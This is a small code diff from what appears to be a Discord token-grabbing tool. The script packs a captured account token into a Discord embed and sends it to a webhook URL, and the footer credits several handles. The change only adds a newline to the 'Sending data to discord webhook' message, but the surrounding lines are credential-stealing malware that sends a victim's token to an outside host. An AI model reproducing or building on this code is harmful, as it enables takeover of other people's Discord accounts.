@@ -116,7 +116,7 @@ def main(webhook_url) -> None:
         embed.add_embed_field(name='Token', value=f"```yaml\n{token}\n```", inline=False)
     webhook.add_embed(embed)
     embed.set_footer(text='By Luci (9P9), Lemon.-_-.#3714, the-cult-of-integral and mte0', inline=False)
-    Write.Print("[!]Sending data to discord webhook...", Colors.red_to_purple)
+    Write.Print("\n[!]Sending data to discord webhook...", Colors.red_to_purple)
     webhook.execute()
     Write.Input('\n\nPress any button to quit.', Colors.blue_to_green)
     
